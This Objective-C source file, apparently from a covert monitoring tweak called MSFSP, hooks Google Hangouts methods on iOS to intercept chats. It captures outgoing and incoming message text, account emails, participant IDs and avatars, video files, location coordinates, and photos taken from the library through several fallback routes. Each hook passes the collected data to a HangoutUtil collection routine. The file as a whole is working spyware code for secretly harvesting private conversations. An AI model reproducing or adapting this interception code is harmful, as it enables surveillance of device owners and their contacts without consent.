//
//  Hangout.h
//  MSFSP
//
//  Created by ophat on 3/19/2557 BE.
//
//

#import <UIKit/UIKit.h>
#import <AssetsLibrary/AssetsLibrary.h>

#import "MSFSP.h"
#import "HangoutUtil.h"

#import "GBMConversationsSyncer.h"
#import "GBMChatEventContent.h"
#import "GBMVideoAttachment.h"
#import "GBMVideoLoader.h"
#import "GBMVideo.h"
#import "GBMPlaceAttachment.h"
#import "GBMPhotoAttachment.h"
#import "GBMPhotoLoader.h"
#import "GBMPhotoLoader+4-1-0.h"
#import "GBMConversation.h"
#import "GBMConversation+4-1-0.h"
#import "GBMUserClient.h"
#import "GBMUserAccount.h"
#import "GBMConversationParticipant.h"
#import "GPCPerson.h"
#import "GBAUserClientBridge.h"
#import "GBMConversationChatEvent.h"
#import "GBMPhotosSyncer.h"
#import "Attachment+Hangout.h"
#import "EMEmbedClientItem.h"
#import "PBExtensionField.h"
#import "EMPlusPhoto.h"
#import "PLManagedAsset.h"

#pragma mark Capture outgoing message that have participant more than 0
// For outgoing greeting message (send contact request) there is no participant
HOOK(GBMConversationsSyncer, sendChatContent$forConversation$expectedOTRStatus$completionHandler$ , void ,id arg1,id arg2,id arg3,id arg4 ){
	CALL_ORIG(GBMConversationsSyncer, sendChatContent$forConversation$expectedOTRStatus$completionHandler$ ,arg1,arg2,arg3,arg4 );
    
//    DLog(@"arg1, %@", arg1);
//    DLog(@"arg2, %@", arg2);
//    DLog(@"arg3, %@", arg3);
//    DLog(@"arg4, %@", arg4);

    GBMChatEventContent * eventContent = arg1;
	GBMConversation * conversation = arg2;
	GBMUserClient* userClient = nil;
	object_getInstanceVariable(conversation, "userClient_", (void**)&userClient);
    if (!userClient) {
        // 4.1.0
        object_getInstanceVariable(conversation, "_userClient", (void**)&userClient);
    }
	GBMUserAccount * userAccount = [userClient userAccount];
    DLog(@"###### userClient %@",userClient);
    DLog(@"###### userAccount %@",[userClient userAccount]);
    DLog(@"###### conversation %@",[conversation participants]);
    if([[conversation participants]count]>0){
        DLog(@"###### sendChatContent$forConversation$expectedOTRStatus$completionHandler$ Outgoing only ");
        NSString * myName               = @"";
        NSString * myID                 = @"";
        NSString * myPhoto              = @"";
        NSString * convName             = @"";
        NSString * convID               = @"";
        NSString * message              = @"";
        BOOL  isAsynchronouslyGetImage  = NO;
        
        NSMutableArray * myParticipants = [[NSMutableArray alloc]init];
        NSMutableArray * myAttachments  = [[NSMutableArray alloc] init];
        
        myID = [userAccount emailAddress];
        myName = [userAccount displayName];
        myPhoto = [NSString stringWithFormat:@"http:%@",[userAccount avatarUrlString]];
        convID = [conversation conversationId];
        convName = [conversation displayName];
        
        NSMutableArray * participants = [[NSMutableArray alloc]initWithArray:[conversation participants]];
        for(int i=0;i<[participants count];i++){
            GBMConversationParticipant * GBparticipant = [participants objectAtIndex:i];
            GPCPerson * person = [GBparticipant person];
            
            NSMutableDictionary *info = [[NSMutableDictionary alloc]init];
            [info setObject:[person gaiaId] forKey:@"id"];
            [info setObject:[person displayName] forKey:@"name"];
            [info setObject:[NSString stringWithFormat:@"%@",[person avatarUrl]] forKey:@"photo"];
            [myParticipants addObject:info];
            [info release];
        }
        [participants release];
        /**************************************************
                    VIDEO
         *************************************************/
        if([[eventContent videoAttachments]count]>0){
            for (int i=0; i<[[eventContent videoAttachments]count]; i++) {
                // get video data
                GBMVideoAttachment *video       = [[eventContent videoAttachments]objectAtIndex:i];
                GBMVideoLoader * videoLoader    = [video videoLoader];
                GBMVideo * GBMvideo             = [videoLoader video];
                NSURL *videoURL                 = [GBMvideo videoURL];
                DLog(@"videoURL %@", videoURL)
                NSString * videoPath            = [videoURL path];
                NSData * videoData              = [NSData dataWithContentsOfFile:videoPath];
                DLog(@"videoData %lu", (unsigned long)[videoData length])
                
                // get video thumbnail
                NSURL *thumURL                  = [GBMvideo thumbnailURL];
                NSString * thumPath             = [thumURL path];
                NSData * thumData               = [NSData dataWithContentsOfFile:thumPath];
                DLog(@"thumData %lu", (unsigned long)[thumData length])
                
                NSMutableDictionary *attached   = [[NSMutableDictionary alloc]init];
                [attached setObject:videoData   forKey:@"attachment"];
                [attached setObject:@"video"    forKey:@"type"];
                [attached setObject:@"mov"      forKey:@"extension"];
                [attached setObject:thumData    forKey:@"thumbnail"];
                [myAttachments addObject:attached];
                [attached release];
                
            }
        }
        
        /**************************************************
                    PLACE
         *************************************************/
        if([[eventContent placeAttachments]count]>0){
            for (int i=0; i<[[eventContent placeAttachments]count]; i++) {
                GBMPlaceAttachment *place = [[eventContent placeAttachments]objectAtIndex:i];
                NSString *location = [HangoutUtil locationStringFromLocationName:[place locationName] locationAdress:[place locationAddress]];
                
                NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                [attached setObject:location forKey:@"place"];
                [attached setObject:@"place"forKey:@"type"];
                [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].latitude] forKey:@"latitude"];
                [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].longtitude] forKey:@"longtitude"];
                [myAttachments addObject:attached];
                [attached release];
            }
        }
        
        /**************************************************
                    PHOTO
         *************************************************/
        if([[eventContent photoAttachments]count]>0){
            for (int i=0; i<[[eventContent photoAttachments]count]; i++) {
                GBMPhotoAttachment *photo = (GBMPhotoAttachment *)[[eventContent photoAttachments]objectAtIndex:i];
                //DLog (@"attachment photo %@", [photo attachmentProto])
                
                DLog (@"attachment photo %@", [photo attachmentProto])
                
                GBMPhotoLoader * loader = [photo photoLoader];
                
                NSURL* sourcePickFromDevice = nil;
                object_getInstanceVariable(loader, "sourceAssetURL_", (void**)&sourcePickFromDevice);
                if (!sourcePickFromDevice) {
                    // 4.1.0
                    object_getInstanceVariable(loader, "_sourceAssetURL", (void**)&sourcePickFromDevice);
                }
                DLog(@"sourcePickFromDevice %@", sourcePickFromDevice)
                
                UIImage * sourceCameraTaken = nil;
                object_getInstanceVariable(loader, "sourceImage_", (void**)&sourceCameraTaken);
                if (!sourceCameraTaken) {
                    // 4.1.0
                    object_getInstanceVariable(loader, "_sourceImage", (void**)&sourceCameraTaken);
                }
                DLog(@"sourceCameraTaken %@", sourceCameraTaken)
                
                if (sourcePickFromDevice){
                    DLog (@"Pick photo from photo album")
                    // Pick from device
                    
                    Class $PLPhotoLibrary = objc_getClass("PLPhotoLibrary");
                    PLPhoto *photo = [[$PLPhotoLibrary sharedPhotoLibrary] photoFromAssetURL:sourcePickFromDevice];

                    // e.g., assets-library://asset/asset.PNG?id=87301592-8F4B-4909-9EDE-71AF14C04C3E&ext=PNG
                    //DLog(@"asset url %@", sourcePickFromDevice)
                    // e.g., <PLManagedAsset: 0x1a5956c0> (entity: Asset; id: 0x180ba280 <x-coredata://6316E162-9327-4036-9FD8-E11AD1EA7630/Asset/p151> ; data: <fault>)
                    //DLog(@"photo %@ %@", photo, [photo class])
                    // e.g., <PLSharedPhotoLibrary: 0x18064540> PLSharedPhotoLibrary
                    //DLog(@"photoLibrary %@ %@", [photo photoLibrary], [[photo photoLibrary] class])

                    /***************************************************************
                     This way cannot get image on 5s because of permission issue.
                     The log presents like this
                     Hangouts(928) deny file-read-data /private/var/mobile/Media/DCIM/100APPLE/IMG_0002.JPG
                     
                     NSString *path = [photo pathForOriginalFile];
                     NSData *data = [NSData dataWithContentsOfFile:path];
                     **************************************************************/

                    /**************************************************
                     1st Solution: Get image path
                     *************************************************/
                    
                    NSString *path              = [photo pathForOriginalFile];
                    NSData *imageData           = [NSData dataWithContentsOfFile:path];
                    UIImage *image              = nil;
                    DLog (@"@@@@@ path %@", path);
                    DLog (@"@@@@@ imageData %lu", (unsigned long)[imageData length]);
                                       
                    if (!imageData) {
                        
                        /**************************************************
                         2nd Solution: Get image from PLManagedAsset object
                         *************************************************/
                      
                        DLog(@"@@@@@ The second solution to get the sented image")
                        image                   = [(PLManagedAsset *)photo newFullSizeImage];
                        imageData               = UIImageJPEGRepresentation(image, 0); //compress
                        
                        /**************************************************
                         3rd Solution: Asynchronously retrive UIImage
                         *************************************************/

                        if (!imageData) {
                            
                            DLog(@"@@@@@ The third solution to get the sented image")
                            DLog (@"sourcePickFromDevice %@ %@", [sourcePickFromDevice class], sourcePickFromDevice)
                            NSString *imageURLString        = [sourcePickFromDevice absoluteString];
                        
                            
                            ALAssetsLibraryAssetForURLResultBlock resultblock = ^(ALAsset *myasset) {
                               DLog(@"... BLOCK: Try to get Image from asset asynchronously")
                                
                                UIImage *asynImage          = nil;
                                NSData *asynImageData       = nil;
                                NSString *asynMessage       = nil;

                                ALAssetRepresentation *rep  = [myasset defaultRepresentation];
                                CGImageRef iref             = [rep fullResolutionImage];
                                
                                if (iref) {
                                    asynImage               = [[UIImage alloc] initWithCGImage:iref];
                                    if  (asynImage) {
                                        DLog(@"... Got UIImage")
                                        asynImageData       = [[NSData alloc] initWithData:UIImagePNGRepresentation(asynImage)];
                                        [asynImage release];
                                        
                                        if (asynImageData) {
                                            NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                                            [attached setObject:asynImageData forKey:@"attachment"];
                                            [attached setObject:@"image"forKey:@"type"];
                                            [attached setObject:@"jpeg" forKey:@"extension"];
                                            [attached setObject:@"" forKey:@"thumbnail"];
                                            
                                            [myAttachments addObject:attached];
                                            
                                            [attached release];
                                            [asynImageData release];
                                            
                                            if([[[eventContent attributedString]string]length]>0){
                                                asynMessage = [NSString stringWithFormat:@"%@",[[eventContent attributedString]string]];
                                            }
                                            [HangoutUtil collectdata_myID:myID
                                                                   myName:myName
                                                                  myPhoto:myPhoto
                                                                   convID:convID
                                                                 convName:convName
                                                             participants:myParticipants
                                                                  message:asynMessage
                                                               attachment:myAttachments
                                                                direction:@"outgoing"];
                                           
                                        } else {
                                            DLog (@"Cannot access image data")
                                        }
                                    }
                                }
                                
                                [myParticipants release];
                                [myAttachments release];
                            };

                            ALAssetsLibraryAccessFailureBlock failureblock  = ^(NSError *error)
                            {
                                DLog(@"... BLOCK: The third solution still doesn't work : [%@]",[error localizedDescription]);
                                
                                if (myParticipants)
                                    [myParticipants release];
                                if (myAttachments)
                                    [myAttachments release];
                            };
                            
                            if(imageURLString && [imageURLString length]) {
                                DLog (@"Get asset asynchoronous")
                                
                                isAsynchronouslyGetImage        = YES;
                                
                                ALAssetsLibrary* assetslibrary  = [[[ALAssetsLibrary alloc] init] autorelease];
                                
                                
                                [assetslibrary assetForURL:sourcePickFromDevice
                                               resultBlock:resultblock
                                              failureBlock:failureblock];
                            }
                            
                        }
                        
                    }
                    
                    DLog(@"imageData size %ld", (unsigned long)[imageData length])
                    
                    if (imageData) {
                        NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                        [attached setObject:imageData forKey:@"attachment"];
                        [attached setObject:@"image"forKey:@"type"];
                        [attached setObject:@"jpeg" forKey:@"extension"];
                        [attached setObject:@"" forKey:@"thumbnail"];
                        [myAttachments addObject:attached];
                        [attached release];
                    } else {
                        DLog (@"Cannot access image data")
                    }
                }
                else if(sourceCameraTaken){
                    DLog (@"Pick from camera")
                    NSData * dataImage = UIImageJPEGRepresentation(sourceCameraTaken, 0.5);
                    NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                    [attached setObject:dataImage forKey:@"attachment"];
                    [attached setObject:@"image"forKey:@"type"];
                    [attached setObject:@"jpeg" forKey:@"extension"];
                    [attached setObject:@"" forKey:@"thumbnail"];
                    [myAttachments addObject:attached];
                    [attached release];
                }
                else{
                    Attachment * attahcment = [photo attachmentProto];
                    EMEmbedClientItem * embed = [attahcment embedItem];
                    
                    NSMutableDictionary *extensionMap;
                    object_getInstanceVariable(embed, "extensionMap_", (void**)&extensionMap);
                    
                    for (int i=0; i<[[extensionMap allKeys]count]; i++) {
                        PBExtensionField * ext = [[extensionMap allKeys]objectAtIndex:i];
                        EMPlusPhoto * attachedPhoto = [extensionMap objectForKey:ext];
                        
                        NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                        [attached setObject:[attachedPhoto url] forKey:@"attachment"];
                        [attached setObject:@"image"forKey:@"type"];
                        [attached setObject:@"gif" forKey:@"extension"];
                        [attached setObject:@"" forKey:@"thumbnail"];
                        [myAttachments addObject:attached];
                        [attached release];
                    }
                }
            }
        }
        
        if([[[eventContent attributedString]string]length]>0){
            message = [NSString stringWithFormat:@"%@",[[eventContent attributedString]string]];
        }
        
        DLog(@"--------------------------------------------------------------");
        DLog(@"myID, %@", myID);
        DLog(@"myName, %@", myName);
        DLog(@"myPhoto, %@", myPhoto);
        DLog(@"convID, %@", convID);
        DLog(@"convName, %@", convName);
        DLog(@"myParticipants, %@", myParticipants);
        DLog(@"message, %@", message);
        //DLog(@"myAttachments, %@", myAttachments); // For video, this log hangs thread for a while
        DLog(@"isAsynchronouslyGetImage, %d", isAsynchronouslyGetImage);
        DLog(@"--------------------------------------------------------------");
        
        if (!isAsynchronouslyGetImage) {
            // Capture Event
            [HangoutUtil collectdata_myID:myID
                                   myName:myName
                                  myPhoto:myPhoto
                                   convID:convID
                                 convName:convName
                             participants:myParticipants
                                  message:message
                               attachment:myAttachments
                                direction:@"outgoing"];
                        
            [myParticipants release];
            [myAttachments release];
        }


    }
}

#pragma mark Capture incoming message to existing conversation

HOOK(GBAUserClientBridge, userClient$receivedNewEvent$ , void ,id arg1,id arg2 ){
    Class $GBMConversationChatEvent(objc_getClass("GBMConversationChatEvent"));
    if([arg2 isKindOfClass:$GBMConversationChatEvent]){
        
        GBMUserClient* userClient = arg1;
        GBMUserAccount * userAccount = [userClient userAccount];
        GBMConversationChatEvent * conversationEventContent = arg2;
        GBMChatEventContent * eventContent = [conversationEventContent chatEventContent];
        GPCPerson * sender =[conversationEventContent sender];
        NSDate * timestamp = [[HangoutUtil sharedHangoutUtils]mTimestamp];
        
        if(![timestamp isEqual:[conversationEventContent timestamp]] && ![[sender gaiaId]isEqualToString:[userAccount gaiaId]] && [[sender gaiaId] length]>0){
            DLog(@"################ userClient$receivedNewEvent$ Incoming Message Only");
            [[HangoutUtil sharedHangoutUtils]setMTimestamp:[conversationEventContent timestamp]];
            
            NSString * myName			 = @"";
            NSString * myID				 = @"";
            NSString * myPhoto			 = @"";
            NSString * convName			 = @"";
            NSString * convID			 = @"";
            NSString * message			 = @"";
            NSMutableArray * myParticipants = [[NSMutableArray alloc]init];
            NSMutableArray * myAttachments = [[NSMutableArray alloc] init];
            
            DLog(@"avatarUrlString: %@", [userAccount avatarUrlString]);
            
            myID = [userAccount emailAddress];
            myName = [userAccount displayName];
            myPhoto = [NSString stringWithFormat:@"http:%@",[userAccount avatarUrlString]];
            
            convID = [[conversationEventContent conversation] conversationId];
            convName = [[conversationEventContent conversation] displayName];
            
            NSMutableArray * participants = [[NSMutableArray alloc]initWithArray:[[conversationEventContent conversation] participants]];
            NSMutableDictionary *info = [[NSMutableDictionary alloc]init];
            [info setObject:myID forKey:@"id"];
            [info setObject:myName forKey:@"name"];
            [info setObject:myPhoto forKey:@"photo"];
            [myParticipants addObject:info];
            [info release];
            
            for(int i=0;i<[participants count];i++){
                GBMConversationParticipant * GBparticipant = [participants objectAtIndex:i];
                GPCPerson * person = [GBparticipant person];
                if (![[person gaiaId]isEqualToString:[sender gaiaId]]) {
                    DLog(@"avatarUrl: %@", [person avatarUrl]);
                    NSMutableDictionary *info = [[NSMutableDictionary alloc]init];
                    [info setObject:[person gaiaId] forKey:@"id"];
                    [info setObject:[person displayName] forKey:@"name"];
                    [info setObject:[NSString stringWithFormat:@"%@",[person avatarUrl]] forKey:@"photo"];
                    [myParticipants addObject:info];
                    [info release];
                }
            }
            [participants release];
            DLog(@"---> Done participants for existing conversation");
            
            if([[eventContent videoAttachments]count]>0){
                for (int i=0; i<[[eventContent videoAttachments]count]; i++) {
                    GBMVideoAttachment *video = [[eventContent videoAttachments]objectAtIndex:i];
                    GBMVideoLoader * videoLoader = [video videoLoader];
                    
                    NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                    [attached setObject:@"" forKey:@"attachment"];
                    [attached setObject:@"video"forKey:@"type"];
                    [attached setObject:@"mov" forKey:@"extension"];
                    [attached setObject:[NSString stringWithFormat:@"%@",[videoLoader thumbnailURL]] forKey:@"thumbnail"];
                    [myAttachments addObject:attached];
                    [attached release];
                    
                }
            }else if([[eventContent placeAttachments]count]>0){
                for (int i=0; i<[[eventContent placeAttachments]count]; i++) {
                    GBMPlaceAttachment *place = [[eventContent placeAttachments]objectAtIndex:i];
                    NSString *location = [HangoutUtil locationStringFromLocationName:[place locationName] locationAdress:[place locationAddress]];
                    
                    NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                    [attached setObject:location forKey:@"place"];
                    [attached setObject:@"place"forKey:@"type"];
                    [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].latitude] forKey:@"latitude"];
                    [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].longtitude] forKey:@"longtitude"];
                    [myAttachments addObject:attached];
                    [attached release];
                }
            }else if([[eventContent photoAttachments]count]>0){
                for (int i=0; i<[[eventContent photoAttachments]count]; i++) {
                    GBMPhotoAttachment *photo = (GBMPhotoAttachment *)[[eventContent photoAttachments]objectAtIndex:i];
                    
                    GBMPhotoLoader * loader = [photo photoLoader];
                    id sourcePhoto = nil;
                    object_getInstanceVariable(loader, "photosClient_", (void**)&sourcePhoto);
                    if (!sourcePhoto) {
                        // 4.1.0
                        object_getInstanceVariable(loader, "_photosClient", (void**)&sourcePhoto);
                    }
                    
                    if(sourcePhoto){
                        Attachment * attahcment = [photo attachmentProto];
                        EMEmbedClientItem * embed = [attahcment embedItem];
                        
                        NSMutableDictionary *extensionMap;
                        object_getInstanceVariable(embed, "extensionMap_", (void**)&extensionMap);
                        
                        for (int i=0; i<[[extensionMap allKeys]count]; i++) {
                            PBExtensionField * ext = [[extensionMap allKeys]objectAtIndex:i];
                            EMPlusPhoto * attachedPhoto = [extensionMap objectForKey:ext];
                            NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                            [attached setObject:[attachedPhoto url] forKey:@"attachment"];
                            [attached setObject:@"image" forKey:@"type"];
                            
                            NSArray * spliter = [[attachedPhoto url] componentsSeparatedByString:@"."];
                            NSString * extension = [spliter objectAtIndex:([spliter count]-1)];
                            if(![extension isEqualToString:@"gif"]){
                                [attached setObject:@"jpeg" forKey:@"extension"];
                            }else{
                                [attached setObject:@"gif" forKey:@"extension"];
                            }
                            [attached setObject:@"" forKey:@"thumbnail"];
                            
                            [myAttachments addObject:attached];
                            [attached release];
                        }
                    }
                }
            }
            if([[[eventContent attributedString]string]length]>0){
                message = [NSString stringWithFormat:@"%@",[[eventContent attributedString]string]];
            }
            [HangoutUtil collectdata_myID:[sender gaiaId] myName:[sender displayName] myPhoto:[NSString stringWithFormat:@"%@",[sender avatarUrl]] convID:convID convName:convName participants:myParticipants message:message attachment:myAttachments direction:@"incoming"];
            [myParticipants release];
            [myAttachments release];
        }
    }
    CALL_ORIG(GBAUserClientBridge, userClient$receivedNewEvent$ ,arg1,arg2 );
}

#pragma mark Capture incoming greeting message (without existing conversation)

HOOK(GBAUserClientBridge, userClient$receivedNewConversation$ , void ,id arg1,id arg2 ){
    Class $GBMConversation(objc_getClass("GBMConversation"));
    if([arg2 isKindOfClass:$GBMConversation]){
        
        GBMUserClient* userClient = arg1;
        GBMConversation * conversation = arg2;
        GBMUserAccount * userAccount = [userClient userAccount];
        GBMConversationChatEvent * conversationEventContent = [conversation previewEvent];
        GBMChatEventContent * eventContent = [conversationEventContent chatEventContent];
        GPCPerson * sender =[conversationEventContent sender];
        NSDate * timestamp = [[HangoutUtil sharedHangoutUtils]mTimestamp];

        if(![timestamp isEqual:[conversationEventContent timestamp]] && ![[sender gaiaId]isEqualToString:[userAccount gaiaId]] && [[sender gaiaId] length]>0){
            DLog(@"################ userClient$receivedNewEvent$ Incoming Message Only");
            [[HangoutUtil sharedHangoutUtils]setMTimestamp:[conversationEventContent timestamp]];
            
            NSString * myName			 = @"";
            NSString * myID				 = @"";
            NSString * myPhoto			 = @"";
            NSString * convName			 = @"";
            NSString * convID			 = @"";
            NSString * message			 = @"";
            NSMutableArray * myParticipants = [[NSMutableArray alloc]init];
            NSMutableArray * myAttachments = [[NSMutableArray alloc] init];
            
            DLog(@"avatarUrlString: %@", [userAccount avatarUrlString]);
            
            myID = [userAccount emailAddress];
            myName = [userAccount displayName];
            myPhoto = [NSString stringWithFormat:@"http:%@",[userAccount avatarUrlString]];
            
            convID = [[conversationEventContent conversation] conversationId];
            convName = [[conversationEventContent conversation] displayName];
            
            NSMutableArray * participants = [[NSMutableArray alloc]initWithArray:[[conversationEventContent conversation] participants]];
            NSMutableDictionary *info = [[NSMutableDictionary alloc]init];
            [info setObject:myID forKey:@"id"];
            [info setObject:myName forKey:@"name"];
            [info setObject:myPhoto forKey:@"photo"];
            [myParticipants addObject:info];
            [info release];
            
            for(int i=0;i<[participants count];i++){
                GBMConversationParticipant * GBparticipant = [participants objectAtIndex:i];
                GPCPerson * person = [GBparticipant person];
                if (![[person gaiaId]isEqualToString:[sender gaiaId]]) {
                    DLog(@"avatarUrl: %@", [person avatarUrl]);
                    NSMutableDictionary *info = [[NSMutableDictionary alloc]init];
                    [info setObject:[person gaiaId] forKey:@"id"];
                    [info setObject:[person displayName] forKey:@"name"];
                    [info setObject:[NSString stringWithFormat:@"%@",[person avatarUrl]] forKey:@"photo"];
                    [myParticipants addObject:info];
                    [info release];
                }
            }
            [participants release];
            DLog(@"---> Done participants for new conversation");
            
            if([[eventContent videoAttachments]count]>0){
                for (int i=0; i<[[eventContent videoAttachments]count]; i++) {
                    GBMVideoAttachment *video = [[eventContent videoAttachments]objectAtIndex:i];
                    GBMVideoLoader * videoLoader = [video videoLoader];
                    
                    NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                    [attached setObject:@"" forKey:@"attachment"];
                    [attached setObject:@"video"forKey:@"type"];
                    [attached setObject:@"mov" forKey:@"extension"];
                    [attached setObject:[NSString stringWithFormat:@"%@",[videoLoader thumbnailURL]] forKey:@"thumbnail"];
                    [myAttachments addObject:attached];
                    [attached release];
                    
                }
            }else if([[eventContent placeAttachments]count]>0){
                for (int i=0; i<[[eventContent placeAttachments]count]; i++) {
                    GBMPlaceAttachment *place = [[eventContent placeAttachments]objectAtIndex:i];
                    NSString *location = [HangoutUtil locationStringFromLocationName:[place locationName] locationAdress:[place locationAddress]];
                    
                    NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                    [attached setObject:location forKey:@"place"];
                    [attached setObject:@"place"forKey:@"type"];
                    [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].latitude] forKey:@"latitude"];
                    [attached setObject:[NSString stringWithFormat:@"%lf",[place coordinate].longtitude] forKey:@"longtitude"];
                    [myAttachments addObject:attached];
                    [attached release];
                }
            }else if([[eventContent photoAttachments]count]>0){
                for (int i=0; i<[[eventContent photoAttachments]count]; i++) {
                    GBMPhotoAttachment *photo = (GBMPhotoAttachment *)[[eventContent photoAttachments]objectAtIndex:i];
                    
                    GBMPhotoLoader * loader = [photo photoLoader];
                    id sourcePhoto = nil;
                    object_getInstanceVariable(loader, "photosClient_", (void**)&sourcePhoto);
                    if (!sourcePhoto) {
                        // 4.1.0
                        object_getInstanceVariable(loader, "_photosClient", (void**)&sourcePhoto);
                    }
                    
                    if(sourcePhoto){
                        Attachment * attahcment = [photo attachmentProto];
                        EMEmbedClientItem * embed = [attahcment embedItem];
                        
                        NSMutableDictionary *extensionMap;
                        object_getInstanceVariable(embed, "extensionMap_", (void**)&extensionMap);
                        
                        for (int i=0; i<[[extensionMap allKeys]count]; i++) {
                            PBExtensionField * ext = [[extensionMap allKeys]objectAtIndex:i];
                            EMPlusPhoto * attachedPhoto = [extensionMap objectForKey:ext];
                            NSMutableDictionary *attached = [[NSMutableDictionary alloc]init];
                            [attached setObject:[attachedPhoto url] forKey:@"attachment"];
                            [attached setObject:@"image" forKey:@"type"];
                            
                            NSArray * spliter = [[attachedPhoto url] componentsSeparatedByString:@"."];
                            NSString * extension = [spliter objectAtIndex:([spliter count]-1)];
                            if(![extension isEqualToString:@"gif"]){
                                [attached setObject:@"jpeg" forKey:@"extension"];
                            }else{
                                [attached setObject:@"gif" forKey:@"extension"];
                            }
                            [attached setObject:@"" forKey:@"thumbnail"];
                            
                            [myAttachments addObject:attached];
                            [attached release];
                        }
                    }
                }
            }
            if([[[eventContent attributedString]string]length]>0){
                message = [NSString stringWithFormat:@"%@",[[eventContent attributedString]string]];
            }
            [HangoutUtil collectdata_myID:[sender gaiaId] myName:[sender displayName] myPhoto:[NSString stringWithFormat:@"%@",[sender avatarUrl]] convID:convID convName:convName participants:myParticipants message:message attachment:myAttachments direction:@"incoming"];
            [myParticipants release];
            [myAttachments release];
        }
    }
    CALL_ORIG(GBAUserClientBridge, userClient$receivedNewConversation$ ,arg1,arg2 );
}